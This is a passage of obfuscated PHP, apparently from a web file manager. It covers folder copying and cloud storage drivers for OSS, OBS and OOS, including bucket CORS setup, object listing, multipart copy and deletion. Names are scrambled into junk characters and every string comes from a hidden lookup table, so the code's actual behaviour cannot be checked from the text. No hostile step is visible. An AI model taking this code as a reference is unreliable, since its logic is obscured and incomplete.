$³Ë˜¥ä²[$–°€ûÌ‚[191]] == $–°€ûÌ‚[677]) { return; } $şÖî¦¨Å = array($–°€ûÌ‚[596] => array($–°€ûÌ‚[627], $³Ë˜¥ä²[$–°€ûÌ‚[596]] . $ûı²Ä . $–°€ûÌ‚[628])); $¶¤¾»á = $this->field($–°€ûÌ‚[501])->where($şÖî¦¨Å)->getField($–°€ûÌ‚[194], !0); if (!$¶¤¾»á) { return; } $şÖî¦¨Å = array($–°€ûÌ‚[194] => array($–°€ûÌ‚[7], $¶¤¾»á), $–°€ûÌ‚[678] => 1); $µ ®¹áË = Model($–°€ûÌ‚[679])->field($–°€ûÌ‚[680])->where($şÖî¦¨Å)->select(); if (!$µ ®¹áË) { return; } $µ ®¹áË = array_to_keyvalue($µ ®¹áË, $–°€ûÌ‚[12], $–°€ûÌ‚[680]); $şÖî¦¨Å = array($–°€ûÌ‚[680] => array($–°€ûÌ‚[7], $µ ®¹áË)); Model($–°€ûÌ‚[679])->where($şÖî¦¨Å)->save(array($–°€ûÌ‚[678] => 0)); Model($–°€ûÌ‚[681])->where($şÖî¦¨Å)->delete(); } public function copyFolderFromIO($•¬å½çÑ, $­¸Ü‡‰¥, $ªÎÔö×İ, $Øó×‘ÓÎ, $‰´ƒú¬Ú, $ı¨Á’¡Ú = false) { $ˆ†ÇØş =& $_SERVER[É¨™èà]; $×¾‹ı³ = array($ˆ†ÇØş[645] => array(), $ˆ†ÇØş[646] => array(), $ˆ†ÇØş[644] => array(), $ˆ†ÇØş[682] => array()); $–å§¦š³ = $ı¨Á’¡Ú ? $ı¨Á’¡Ú : $•¬å½çÑ->pathThis($­¸Ü‡‰¥); $‚ûÒ ø = $this->fileNameExist($ªÎÔö×İ, $–å§¦š³); $äÑø²¥Ó = $this->mkdir($ªÎÔö×İ, $–å§¦š³, $Øó×‘ÓÎ); if (!$‚ûÒ ø || $Øó×‘ÓÎ == REPEAT_RENAME_FOLDER) { $Øó×‘ÓÎ = !1; } if ($‚ûÒ ø) { $this->_childrenAllMake($‚ûÒ ø); } Hook::trigger($ˆ†ÇØş[683]); $Ş—“á‰ = KodIO::ioFileDriverGet($ˆ†ÇØş[493] . $ªÎÔö×İ . $ˆ†ÇØş[413]); $this->_copyChildTo($•¬å½çÑ, $­¸Ü‡‰¥, $äÑø²¥Ó, $Øó×‘ÓÎ, $×¾‹ı³, $‰´ƒú¬Ú, $Ş—“á‰); Hook::trigger($ˆ†ÇØş[684]); if ($äÑø²¥Ó) { $this->folderSizeResetChildren($äÑø²¥Ó); } $this->_childrenListClear(); Model($ˆ†ÇØş[647])->addAll($×¾‹ı³[$ˆ†ÇØş[645]], array(), !0); Model($ˆ†ÇØş[648])->eventCopy($äÑø²¥Ó); $this->saveAll($×¾‹ı³[$ˆ†ÇØş[646]]); Model($ˆ†ÇØş[556])->linkAdd($×¾‹ı³[$ˆ†ÇØş[644]]); Model($ˆ†ÇØş[556])->remove($×¾‹ı³[$ˆ†ÇØş[682]]); $this->folderSizeReset($ªÎÔö×İ); $this->updateModifyTime($ªÎÔö×İ); return $äÑø²¥Ó; } private function _copyChildTo($¾›ÏÆá•, $Ú´ñòÆ, $ª—ì×ª×, $•Ÿê—Ï¨, &$¯†ıë¹, $»„ï–Òå, $úÆÍÂ¥™) { $ŞÚ™÷Ü =& $_SERVER[É¨™èà]; $¯’•Âı = $this->sourceInfoCache($ª—ì×ª×); $‘äÊ…Ö = $¾›ÏÆá•->listPath($Ú´ñòÆ); $‘äÊ…Ö = $‘äÊ…Ö ? $‘äÊ…Ö : array($ŞÚ™÷Ü[86] => array(), $ŞÚ™÷Ü[85] => array()); $˜ƒ—Îüõ = array_merge($‘äÊ…Ö[$ŞÚ™÷Ü[86]], $‘äÊ…Ö[$ŞÚ™÷Ü[85]]); $ñèÆ¹›ª = $this->_addFiles($¾›ÏÆá•, $úÆÍÂ¥™, $‘äÊ…Ö[$ŞÚ™÷Ü[86]], $»„ï–Òå); $çÆÌ± = array(); foreach ($˜ƒ—Îüõ as &$¾ ·¹Ğ) { if (isset($ñèÆ¹›ª[$¾ ·¹Ğ[$ŞÚ™÷Ü[32]]])) { $¾ ·¹Ğ = $ñèÆ¹›ª[$¾ ·¹Ğ[$ŞÚ™÷Ü[32]]]; } $¾ ·¹Ğ[$ŞÚ™÷Ü[495]] = $¾ ·¹Ğ[$ŞÚ™÷Ü[33]] == $ŞÚ™÷Ü[78]; $¾ ·¹Ğ[$ŞÚ™÷Ü[496]] = substr(_get($¾ ·¹Ğ, $ŞÚ™÷Ü[169], $ŞÚ™÷Ü[12]), 0, 10); $¾ ·¹Ğ[$ŞÚ™÷Ü[79]] = _get($¾ ·¹Ğ, $ŞÚ™÷Ü[79], 0); $¾ ·¹Ğ[$ŞÚ™÷Ü[553]] = _get($¾ ·¹Ğ, $ŞÚ™÷Ü[553], 0); if (!isset($¾ ·¹Ğ[$ŞÚ™÷Ü[685]]) && $¾ ·¹Ğ[$ŞÚ™÷Ü[553]]) { $¯†ıë¹[$ŞÚ™÷Ü[682]][] = $¾ ·¹Ğ[$ŞÚ™÷Ü[553]]; } if ($•Ÿê—Ï¨) { $Šøï‰ª = $this->fileNameExistCache($ª—ì×ª×, $¾ ·¹Ğ[$ŞÚ™÷Ü[32]]); if ($Šøï‰ª) { if ($¾ ·¹Ğ[$ŞÚ™÷Ü[495]] || $•Ÿê—Ï¨ == REPEAT_SKIP) { continue; } if ($•Ÿê—Ï¨ == REPEAT_REPLACE) { $ú’šÇªÑ = $this->sourceInfoCache($Šøï‰ª); $Ÿ¤´Â½ = $this->fileHistory($ú’šÇªÑ, $¾ ·¹Ğ[$ŞÚ™÷Ü[553]], $¾ ·¹Ğ[$ŞÚ™÷Ü[79]]); if ($Ÿ¤´Â½) { $¯†ıë¹[$ŞÚ™÷Ü[644]][] = $¾ ·¹Ğ[$ŞÚ™÷Ü[553]]; } continue; } else { if ($•Ÿê—Ï¨ == REPEAT_RENAME) { $¾ ·¹Ğ[$ŞÚ™÷Ü[32]] = $this->fileNameAutoCache($ª—ì×ª×, $¾ ·¹Ğ[$ŞÚ™÷Ü[32]], $•Ÿê—Ï¨, !1); } } } } if (!$¾ ·¹Ğ[$ŞÚ™÷Ü[495]] && $¾ ·¹Ğ[$ŞÚ™÷Ü[553]] == 0) { continue; } if (!$¾ ·¹Ğ[$ŞÚ™÷Ü[495]] && $¾ ·¹Ğ[$ŞÚ™÷Ü[553]]) { $¯†ıë¹[$ŞÚ™÷Ü[644]][] = $¾ ·¹Ğ[$ŞÚ™÷Ü[553]]; } $çÆÌ±[] = $this->_makeItemData($¾ ·¹Ğ, $¯’•Âı, $¾ ·¹Ğ[$ŞÚ™÷Ü[32]]); } unset($¾ ·¹Ğ); if (!empty($çÆÌ±)) { $this->addAll($çÆÌ±); $this->_childrenListSelect($ª—ì×ª×); } $œ»½¼¼¶ = $this->_childrenList($ª—ì×ª×); $œ»½¼¼¶ = array_to_keyvalue($œ»½¼¼¶, $ŞÚ™÷Ü[32]); foreach ($˜ƒ—Îüõ as $¾ ·¹Ğ) { $ú’šÇªÑ = $œ»½¼¼¶[$¾ ·¹Ğ[$ŞÚ™÷Ü[32]]]; $ÑÔäËÌ = $ú’šÇªÑ[$ŞÚ™÷Ü[194]]; $this->_copyApplyMeta($ú’šÇªÑ, $¯†ıë¹); if ($¾ ·¹Ğ[$ŞÚ™÷Ü[33]] == $ŞÚ™÷Ü[78]) { $¾ ·¹Ğ[$ŞÚ™÷Ü[87]] = $¾›ÏÆá•->getPathInner($¾ ·¹Ğ[$ŞÚ™÷Ü[87]]); $this->_copyChildTo($¾›ÏÆá•, $¾ ·¹Ğ[$ŞÚ™÷Ü[87]], $ÑÔäËÌ, $•Ÿê—Ï¨, $¯†ıë¹, $»„ï–Òå, $úÆÍÂ¥™); } } } private function _addFiles($ÅÑœÀ, $–õÒ½, $šüıÕ¯, $¨šÄ¬) { $¤Êáõ¢Ë =& $_SERVER[É¨™èà]; if (!$šüıÕ¯ || count($šüıÕ¯) == 0) { return array(); } $– ²ÊĞÓ = array(); foreach ($šüıÕ¯ as &$Ïú¡êØù) { Hook::trigger($¤Êáõ¢Ë[686], $Ïú¡êØù); $Ïú¡êØù[$¤Êáõ¢Ë[87]] = $ÅÑœÀ->getPathInner($Ïú¡êØù[$¤Êáõ¢Ë[87]]); $Š¬Ëİı¨ = $ÅÑœÀ->hashSimple($Ïú¡êØù[$¤Êáõ¢Ë[87]]); $ÈÏÊ÷Ú¬ = $ÅÑœÀ->hashMd5($Ïú¡êØù[$¤Êáõ¢Ë[87]]); if (strlen($ÈÏÊ÷Ú¬) > 10 && !isset($– ²ÊĞÓ[$ÈÏÊ÷Ú¬])) { $– ²ÊĞÓ[$ÈÏÊ÷Ú¬] = array(); } $Ïú¡êØù[$¤Êáõ¢Ë[687]] = $Š¬Ëİı¨; $Ïú¡êØù[$¤Êáõ¢Ë[559]] = $ÈÏÊ÷Ú¬; $– ²ÊĞÓ[$ÈÏÊ÷Ú¬][] =& $Ïú¡êØù; if (count($– ²ÊĞÓ[$ÈÏÊ÷Ú¬]) > 1) { $Ïú¡êØù[$¤Êáõ¢Ë[685]] = !0; } Hook::trigger($¤Êáõ¢Ë[688], $Ïú¡êØù); } unset($Ïú¡êØù); $ÁñÎØ‹í = array($¤Êáõ¢Ë[559] => array($¤Êáõ¢Ë[7], array_keys($– ²ÊĞÓ))); $ÕüÄú‘ = Model($¤Êáõ¢Ë[689]); $ƒí¼¢â = $ÕüÄú‘->where($ÁñÎØ‹í)->select(); $ƒí¼¢â = $ƒí¼¢â ? $ƒí¼¢â : array(); foreach ($ƒí¼¢â as $×Ó»Â¯ì) { if (!isset($– ²ÊĞÓ[$×Ó»Â¯ì[$¤Êáõ¢Ë[559]]])) { continue; } $åÎí¦¿Â = $– ²ÊĞÓ[$×Ó»Â¯ì[$¤Êáõ¢Ë[559]]]; foreach ($åÎí¦¿Â as &$Ïú¡êØù) { $Ïú¡êØù[$¤Êáõ¢Ë[553]] = $×Ó»Â¯ì[$¤Êáõ¢Ë[553]]; $Ïú¡êØù[$¤Êáõ¢Ë[685]] = !0; } unset($Ïú¡êØù); } $€°ê îã = array(); foreach ($šüıÕ¯ as $‘¼æ¡ˆ‘) { Hook::trigger($¤Êáõ¢Ë[690], $‘¼æ¡ˆ‘); if (isset($‘¼æ¡ˆ‘[$¤Êáõ¢Ë[685]]) && $‘¼æ¡ˆ‘[$¤Êáõ¢Ë[685]]) { Hook::trigger($¤Êáõ¢Ë[691], $‘¼æ¡ˆ‘); continue; } $Ÿ¦ëÖš = $ÅÑœÀ->getPathInner($‘¼æ¡ˆ‘[$¤Êáõ¢Ë[87]]); $²¼‡û×˜ = $ÕüÄú‘->addFileMake($Ÿ¦ëÖš, $–õÒ½, $‘¼æ¡ˆ‘[$¤Êáõ¢Ë[79]], $‘¼æ¡ˆ‘[$¤Êáõ¢Ë[687]], $‘¼æ¡ˆ‘[$¤Êáõ¢Ë[559]], $‘¼æ¡ˆ‘[$¤Êáõ¢Ë[32]], $¨šÄ¬); Hook::trigger($¤Êáõ¢Ë[691], $‘¼æ¡ˆ‘); if (!is_array($²¼‡û×˜)) { continue; } $€°ê îã[] = $²¼‡û×˜; } $ÕüÄú‘->addAll($€°ê îã); $ÁñÎØ‹í = array($¤Êáõ¢Ë[559] => array($¤Êáõ¢Ë[7], array_keys($– ²ÊĞÓ))); $ƒí¼¢â = $ÕüÄú‘->where($ÁñÎØ‹í)->select(); $ƒí¼¢â = $ƒí¼¢â ? $ƒí¼¢â : array(); foreach ($ƒí¼¢â as $×Ó»Â¯ì) { if (!isset($– ²ÊĞÓ[$×Ó»Â¯ì[$¤Êáõ¢Ë[559]]])) { continue; } $ª‹¥°¹Ş =& $– ²ÊĞÓ[$×Ó»Â¯ì[$¤Êáõ¢Ë[559]]]; foreach ($ª‹¥°¹Ş as &$Ïú¡êØù) { $Ïú¡êØù[$¤Êáõ¢Ë[553]] = $×Ó»Â¯ì[$¤Êáõ¢Ë[553]]; } unset($Ïú¡êØù); } $ıË²É˜ = array(); foreach ($šüıÕ¯ as $Úİà‰£Õ) { $ıË²É˜[$Úİà‰£Õ[$¤Êáõ¢Ë[32]]] = $Úİà‰£Õ; } return $ıË²É˜; } } define($_SERVER[É¨™èà][692], $_SERVER[É¨™èà][693]); goto cï‹ÏëÃô; c¦÷µö¤ã: class PathDriverOBS extends PathDriverBaseS3 { public function __construct($÷¨‹Šƒ) { parent::__construct($÷¨‹Šƒ); $this->setSignVersion($_SERVER[É¨™èà][250]); } public function fileOutImage($†Š´Éò§, $¬³¬Ã˜· = 250) { $ŠÅ£«×ô =& $_SERVER[É¨™èà]; if ($this->size($†Š´Éò§) > 1024 * 1024 * 25) { return $this->fileOutImageServer($†Š´Éò§, $¬³¬Ã˜·); } $Ì¤ç×ºÉ = array($ŠÅ£«×ô[1488] => $ŠÅ£«×ô[1489] . $¬³¬Ã˜· . $ŠÅ£«×ô[1490]); $½‹§ñ›° = $this->link($†Š´Éò§, $Ì¤ç×ºÉ); $this->fileOutLink($½‹§ñ›°); } } class PathDriverOOS extends PathDriverBaseS3 { public function __construct($˜›ãÙŠÊ) { parent::__construct($˜›ãÙŠÊ); $this->setSignVersion($_SERVER[É¨™èà][250]); } public function uploadFormData($Ö´ÖüŞ¾, $’ï•åÃş = 3600) { return $this->uploadFormDataV2($Ö´ÖüŞ¾, $’ï•åÃş); } } class PathDriverOSS extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $bucket = ''; protected $bucketAcl = ''; protected $endpoint = null; protected $client = null; public $ioUploadServer = "\60"; public $ioFileOutServer = "\x30"; public $cdnHost = ''; public $config = array(); public function __construct($—È·¸) { parent::__construct(); include_once SDK_DIR . $_SERVER[É¨™èà][1491]; $this->_init($—È·¸); } public function _init($é£ëšîë) { $¬æç¦ìı =& $_SERVER[É¨™èà]; $this->config = $é£ëšîë; foreach ($é£ëšîë as $®ÑÙÅë => $ÛÒ²ÄÛ ) { if (isset($this->{$®ÑÙÅë})) { $this->{$®ÑÙÅë} = $ÛÒ²ÄÛ ; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { throw new Exception($¬æç¦ìı[1492] . LNG($¬æç¦ìı[1493])); } $this->client = new OSS\OssClient($this->accessKey, $this->secret, $this->domain); $this->client->setConnectTimeout(60); } public function setBucketCors() { $’ßÎÔ´ =& $_SERVER[É¨™èà]; $â¶ÂäÊ“ = new OSS\Model\CorsConfig(); $îğïî³ = new OSS\Model\CorsRule(); $îğïî³->addAllowedOrigin($’ßÎÔ´[1494]); $îğïî³->addAllowedMethod($’ßÎÔ´[1495]); $îğïî³->addAllowedMethod($’ßÎÔ´[1496]); $îğïî³->addAllowedMethod($’ßÎÔ´[1497]); $îğïî³->addAllowedMethod($’ßÎÔ´[1498]); $îğïî³->addAllowedMethod($’ßÎÔ´[165]); $îğïî³->setMaxAgeSeconds(600); $îğïî³->addExposeHeader($’ßÎÔ´[1499]); $îğïî³->addAllowedHeader($’ßÎÔ´[1494]); $â¶ÂäÊ“->addRule($îğïî³); try { $this->client->putBucketCors($this->bucket, $â¶ÂäÊ“); } catch (OSS\Core\OssException $®ˆğ»º) { $this->writeLog(__FUNCTION__ . $’ßÎÔ´[215] . $®ˆğ»º->getMessage()); return !1; } return !0; } public function getBucketCors() { $Ñ›ŞÃë« =& $_SERVER[É¨™èà]; $åÚ±±¼¹ = null; try { $åÚ±±¼¹ = $this->client->getBucketCors($this->bucket); } catch (OSS\Core\OssException $è§í™ø©) { $this->writeLog(__FUNCTION__ . $Ñ›ŞÃë«[215] . $è§í™ø©->getMessage()); return null; } if (!$åÚ±±¼¹ || !($­¤ñŒí™ = $åÚ±±¼¹->getRules())) { return null; } $öŠà†ÁÉ = $­¤ñŒí™[0]->getAllowedOrigins(); $©Ô÷äµ = $­¤ñŒí™[0]->getAllowedMethods(); $ÇĞú•Úı = $­¤ñŒí™[0]->getMaxAgeSeconds(); $·÷œŸÕ = $­¤ñŒí™[0]->getExposeHeaders(); $Ò–èàÀ = $­¤ñŒí™[0]->getAllowedHeaders(); return array($Ñ›ŞÃë«[221] => isset($öŠà†ÁÉ[0]) ? $öŠà†ÁÉ[0] : $Ñ›ŞÃë«[12], $Ñ›ŞÃë«[225] => $©Ô÷äµ, $Ñ›ŞÃë«[1500] => $ÇĞú•Úı, $Ñ›ŞÃë«[1501] => isset($·÷œŸÕ[0]) ? $·÷œŸÕ[0] : $Ñ›ŞÃë«[12], $Ñ›ŞÃë«[222] => isset($Ò–èàÀ[0]) ? $Ò–èàÀ[0] : $Ñ›ŞÃë«[12]); } public function isBucketCors() { $òè¾÷› =& $_SERVER[É¨™èà]; $„µ‡¥äÚ = $this->getBucketCors(); if (!$„µ‡¥äÚ || !is_array($„µ‡¥äÚ)) { return !1; } if ($„µ‡¥äÚ[$òè¾÷›[221]] != $òè¾÷›[223] || $„µ‡¥äÚ[$òè¾÷›[222]] != $òè¾÷›[223]) { return !1; } $ì¦Î¡â = array_map($òè¾÷›[224], $„µ‡¥äÚ[$òè¾÷›[225]]); if (!is_array($ì¦Î¡â)) { $ì¦Î¡â = array(); } $Ñéğª«ó = array($òè¾÷›[226], $òè¾÷›[227], $òè¾÷›[228], $òè¾÷›[229], $òè¾÷›[230]); $ãÖ«Òû = array_diff($Ñéğª«ó, $ì¦Î¡â); return empty($ãÖ«Òû); } public function mkfile($µ‚ß¼êÁ, $ãäØìŸ = '', $ñ•ä‚šé = REPEAT_RENAME) { $²äøÜÉª = $this->setContent($µ‚ß¼êÁ, $ãäØìŸ); if ($²äøÜÉª !== !1) { return $this->getPathOuter($µ‚ß¼êÁ); } return !1; } public function mkdir($¯µ°è‹Ä, $³é¤¹» = REPEAT_SKIP) { if ($³é¤¹» && $this->_isFolder($¯µ°è‹Ä)) { return $this->getPathOuter($¯µ°è‹Ä); } try { $this->client->createObjectDir($this->bucket, $this->pathEncode($¯µ°è‹Ä)); } catch (OSS\Core\OssException $Éí¯ê®Ü) { $this->writeLog(__FUNCTION__ . $_SERVER[É¨™èà][215] . $Éí¯ê®Ü->getMessage()); return !1; } return $this->getPathOuter($¯µ°è‹Ä); } private function fileList($şÅÄÅÚŒ, $°­™¶±ã = '', $¿°ŠÎ×³ = 0) { $·ÎÀÇ†Ë =& $_SERVER[É¨™èà]; $şÅÄÅÚŒ = trim($şÅÄÅÚŒ, $·ÎÀÇ†Ë[8]); $¢Šèƒ§¯ = empty($şÅÄÅÚŒ) && $şÅÄÅÚŒ !== $·ÎÀÇ†Ë[231] ? $·ÎÀÇ†Ë[12] : $şÅÄÅÚŒ . $·ÎÀÇ†Ë[8]; $ò¢½Ëœı = $·ÎÀÇ†Ë[12]; $•¦Ÿ‡ù† = 1000; $¿êìËğ = $Åµ´ËÈú = array(); while (!0) { check_abort(); $ä…µ¼¢ß = array($·ÎÀÇ†Ë[1502] => $°­™¶±ã, $·ÎÀÇ†Ë[1503] => $¢Šèƒ§¯, $·ÎÀÇ†Ë[1504] => $•¦Ÿ‡ù†, $·ÎÀÇ†Ë[1505] => $ò¢½Ëœı); try { $†ÓØ±ˆ = $this->client->listObjects($this->bucket, $ä…µ¼¢ß); } catch (OSS\Core\OssException $ÄşÉª±ø) { $this->writeLog(__FUNCTION__ . $·ÎÀÇ†Ë[215] . $ÄşÉª±ø->getMessage()); break; } $ò¢½Ëœı = $†ÓØ±ˆ->getNextMarker(); $ú…³Æ¬ = $†ÓØ±ˆ->getObjectList(); $îã§Ê‹Ï = $†ÓØ±ˆ->getPrefixList(); foreach ($ú…³Æ¬ as $úö® ô ) { if ($úö® ô ->getKey() == $¢Šèƒ§¯) { continue; } $ÃÑŠÆÇø = $úö® ô ->getKey(); $ØìûÒÍ¿ = $úö® ô ->getSize(); $éÎºö¡‘ = $úö® ô ->getLastModified(); $ÃÀòòªù = trim($úö® ô ->getETag(), $·ÎÀÇ†Ë[121]); $®ğİ¿¨‚ = $¿°ŠÎ×³ ? array($·ÎÀÇ†Ë[32] => $ÃÑŠÆÇø, $·ÎÀÇ†Ë[79] => $ØìûÒÍ¿, $·ÎÀÇ†Ë[207] => strtotime($éÎºö¡‘), $·ÎÀÇ†Ë[1506] => $ÃÀòòªù) : $ÃÑŠÆÇø; $Ñ¦…«Îù = $ØìûÒÍ¿ == 0 && substr($ÃÑŠÆÇø, strlen($ÃÑŠÆÇø) - 1, 1) == $·ÎÀÇ†Ë[8] ? !0 : !1; $«¼Í§Úâ = array($·ÎÀÇ†Ë[79] => $ØìûÒÍ¿, $·ÎÀÇ†Ë[1507] => $ØìûÒÍ¿, $·ÎÀÇ†Ë[88] => strtotime($éÎºö¡‘), $·ÎÀÇ†Ë[1508] => $éÎºö¡‘, $·ÎÀÇ†Ë[1506] => $ÃÀòòªù); $this->cacheMethodInfoSet($ÃÑŠÆÇø, $Ñ¦…«Îù, $«¼Í§Úâ); if ($Ñ¦…«Îù) { $¿êìËğ[] = $ÃÑŠÆÇø; continue; } $Åµ´ËÈú[] = $®ğİ¿¨‚; } foreach ($îã§Ê‹Ï as $Òİ½…Æ) { $¿êìËğ[] = $Òİ½…Æ->getPrefix(); $this->cacheMethodInfoSet($Òİ½…Æ->getPrefix(), !0); } if ($ò¢½Ëœı === $·ÎÀÇ†Ë[12]) { break; } } $this->cacheMethodInfoSet($şÅÄÅÚŒ, !0); return array($·ÎÀÇ†Ë[85] => $¿êìËğ, $·ÎÀÇ†Ë[86] => $Åµ´ËÈú); } public function listObject($ò½¡…·ø, $ã…Ü”šÈ = '') { $•Å¥Â›İ =& $_SERVER[É¨™èà]; $ò½¡…·ø = trim($ò½¡…·ø, $•Å¥Â›İ[8]); $µ½Á¸Ä™ = empty($ò½¡…·ø) && $ò½¡…·ø !== $•Å¥Â›İ[231] ? $•Å¥Â›İ[12] : $ò½¡…·ø . $•Å¥Â›İ[8]; $ßàª‹Øã = $•Å¥Â›İ[12]; $ø¦®İóÃ = 1000; $İã‹”Ÿİ = $úà©¿êâ = array(); while (!0) { check_abort(); $©š‹©ÙĞ = array($•Å¥Â›İ[1502] => $ã…Ü”šÈ, $•Å¥Â›İ[1503] => $µ½Á¸Ä™, $•Å¥Â›İ[1504] => $ø¦®İóÃ, $•Å¥Â›İ[1505] => $ßàª‹Øã); try { $›ğ±º¨É = $this->client->listObjects($this->bucket, $©š‹©ÙĞ); } catch (OSS\Core\OssException $Ùì™›») { $this->writeLog(__FUNCTION__ . $•Å¥Â›İ[215] . $Ùì™›»->getMessage()); break; } $ßàª‹Øã = $›ğ±º¨É->getNextMarker(); $™³ö‡°Û = $›ğ±º¨É->getObjectList(); foreach ($™³ö‡°Û as $ÑñÍÁ»š) { if ($ÑñÍÁ»š->getKey() == $µ½Á¸Ä™) { continue; } $É¼³õø£ = $ÑñÍÁ»š->getKey(); $àÆ¡Ò³ = $ÑñÍÁ»š->getSize(); $½¼ÍÆØ› = $àÆ¡Ò³ == 0 && substr($É¼³õø£, strlen($É¼³õø£) - 1, 1) == $•Å¥Â›İ[8] ? !0 : !1; if ($½¼ÍÆØ›) { continue; } $úà©¿êâ[] = $àÆ¡Ò³ . $•Å¥Â›İ[215] . $É¼³õø£; } if ($ßàª‹Øã === $•Å¥Â›İ[12]) { break; } } return array($•Å¥Â›İ[85] => $İã‹”Ÿİ, $•Å¥Â›İ[86] => $úà©¿êâ); } public function copyFile($ã‡Ä˜×º, $·ş«»Å¼) { $ ¨ò¹Ôª = $this->size($ã‡Ä˜×º); if ($ ¨ò¹Ôª < 1024 * 1024 * 1024) { try { $this->client->copyObject($this->bucket, $ã‡Ä˜×º, $this->bucket, $this->pathEncode($·ş«»Å¼)); } catch (OSS\Core\OssException $‹’›Å•) { $this->writeLog(__FUNCTION__ . $_SERVER[É¨™èà][215] . $‹’›Å•->getMessage()); return !1; } return $this->getPathOuter($·ş«»Å¼); } $Š‡£Õñ« = $this->multiCopyObject($ã‡Ä˜×º, $·ş«»Å¼, $ ¨ò¹Ôª); return $Š‡£Õñ« ? $this->getPathOuter($·ş«»Å¼) : !1; } private function multiCopyObject($ÜêÕëƒ’, $†½óÛ»Û, $ì‡¸¶æ) { $ĞğË ’ë =& $_SERVER[É¨™èà]; try { $ğâ—îİ¸ = array(); if ($¿ñ¨ä£‚ = $this->hashMd5($ÜêÕëƒ’)) { $ğâ—îİ¸ = array(OSS\OssClient::OSS_HEADERS => array($ĞğË ’ë[1509] => $¿ñ¨ä£‚)); } $²›á¯Ó = $this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($†½óÛ»Û), $ğâ—îİ¸); $ÂÆ¶£­“ = 1; $¹ø¡¯ = 0; $˜°ŸŠÖé = array(); $Ù¾®ƒîÅ = 1024 * 1024 * 10; $ìàÎÙº˜ = $this->client->generateMultiuploadParts($ì‡¸¶æ, $Ù¾®ƒîÅ); foreach ($ìàÎÙº˜ as $«µ¯ü”Ê => $û‚ÀÍ‹ë) { $ü‚åğ… = $¹ø¡¯ + (int) $û‚ÀÍ‹ë[$ĞğË ’ë[1510]]; $‹¢Ùå¾” = (int) $û‚ÀÍ‹ë[$ĞğË ’ë[423]] + $ü‚åğ… - 1; $Š°ŠùÌù = array($ĞğË ’ë[167] => $ü‚åğ…, $ĞğË ’ë[168] => $‹¢Ùå¾”); $˜°ŸŠÖé[] = $this->client->uploadPartCopy($this->bucket, $ÜêÕëƒ’, $this->bucket, $this->pathEncode($†½óÛ»Û), $ÂÆ¶£­“, $²›á¯Ó, $Š°ŠùÌù); $ÂÆ¶£­“ = $ÂÆ¶£­“ + 1; } $œÑñ“Ê» = array(); foreach ($˜°ŸŠÖé as $«µ¯ü”Ê => $„”ö¿å³) { $œÑñ“Ê»[] = array($ĞğË ’ë[300] => $«µ¯ü”Ê + 1, $ĞğË ’ë[301] => $„”ö¿å³); } $this->client->completeMultipartUpload($this->bucket, $this->pathEncode($†½óÛ»Û), $²›á¯Ó, $œÑñ“Ê»); } catch (OSS\Core\OssException $ï”Ì¥ˆ„) { $this->writeLog(__FUNCTION__ . $ĞğË ’ë[215] . $ï”Ì¥ˆ„->getMessage()); return !1; } return !0; } public function moveFile($¦±ìòÚ³, $’£º¿ˆ) { if ($this->copyFile($¦±ìòÚ³, $’£º¿ˆ)) { $this->remove($¦±ìòÚ³); return $this->getPathOuter($’£º¿ˆ); } return !1; } public function delFile($€ï•Õï) { try { $this->client->deleteObject($this->bucket, $this->pathEncode($€ï•Õï)); } catch (OSS\Core\OssException $À¦¾®) { $this->writeLog(__FUNCTION__ . $_SERVER[É¨™èà][215] . $À¦¾®->getMessage()); return !1; } return !0; } public function delFolder($ªÂÀƒ) { $©ìæŞ™Ã =& $_SERVER[É¨™èà]; if (!$this->exist($ªÂÀƒ)) { return !0; } $this->listItemCache = !1; $ğŸß‰¡° = $this->fileList($ªÂÀƒ); $this->listItemCache = !0; $’‹˜ø¾å = trim($ªÂÀƒ, $©ìæŞ™Ã[8]) . $©ìæŞ™Ã[8]; if (!empty($ªÂÀƒ) && $ªÂÀƒ !== $©ìæŞ™Ã[231] && !in_array($’‹˜ø¾å, $ğŸß‰¡°[$©ìæŞ™Ã[85]])) { $ğŸß‰¡°[$©ìæŞ™Ã[85]][] = $’‹˜ø¾å; } $Ô¨ìØ“‡ = $this->delByBatch($ğŸß‰¡°[$©ìæŞ™Ã[86]]); if (!$Ô¨ìØ“‡) { return !1; } $Ô¨ìØ“‡ = $this->delByBatch($ğŸß‰¡°[$©ìæŞ™Ã[85]]); if (!$Ô¨ìØ“‡) { return !1; } return $this->delFile($’‹˜ø¾å); } private function delByBatch($Ğ×»†§Š) { foreach (array_chunk($Ğ×»†§Š, 1000) as $¯°——´ƒ) { try { $this->client->deleteObjects($this->bucket, $¯°——´ƒ); } catch (OSS\Core\OssException $¾³€Ğ¡…) { $this->writeLog(__FUNCTION__ . $_SERVER[É¨™èà][215] . $¾³€Ğ¡…->getMessage()); return !1; } } return !0; } public function rename($¡ÄÙ™Á¯, $ˆş€ñ‘¾) { return $this->renameObject($¡ÄÙ™Á¯, $ˆş€ñ‘¾); } private function fileInfo($áå¢Æõ‚, $±š½Àô„ = false, $ş¯µ³ñø = array()) { $ŸˆÔ°õî =& $_SERVER[É¨™èà]; $İĞÆ˜ñ = array($ŸˆÔ°õî[32] => $this->pathThis($áå¢Æõ‚), $ŸˆÔ°õî[87] => $this->getPathOuter($áå¢Æõ‚), $ŸˆÔ°õî[33] => $ŸˆÔ°õî[233], $ŸˆÔ°õî[79] => isset($ş¯µ³ñø[$ŸˆÔ°õî[79]]) ? $ş¯µ³ñø[$ŸˆÔ°õî[79]] : 0, $ŸˆÔ°õî[169] => $this->ext($áå¢Æõ‚)); if ($±š½Àô„) { return $İĞÆ˜ñ; } $İĞÆ˜ñ[$ŸˆÔ°õî[234]] = $İĞÆ˜ñ[$ŸˆÔ°õî[88]] = 0; $İĞÆ˜ñ[$ŸˆÔ°õî[235]] = $İĞÆ˜ñ[$ŸˆÔ°õî[236]] = !0; if (empty($ş¯µ³ñø)) { $ß”¼ØœÌ = $this->objectMeta($áå¢Æõ‚); if (!$ß”¼ØœÌ) { return $İĞÆ˜ñ; } $ş¯µ³ñø = array($ŸˆÔ°õî[88] => strtotime($ß”¼ØœÌ[$ŸˆÔ°õî[1508]]), $ŸˆÔ°õî[79] => $ß”¼ØœÌ[$ŸˆÔ°õî[1507]] + 0, $ŸˆÔ°õî[1506] => $ß”¼ØœÌ[$ŸˆÔ°õî[1506]]); } if (isset($ş¯µ³ñø[$ŸˆÔ°õî[1506]]) && $ş¯µ³ñø[$ŸˆÔ°õî[1506]]) { $İĞÆ˜ñ[$ŸˆÔ°õî[238]] = 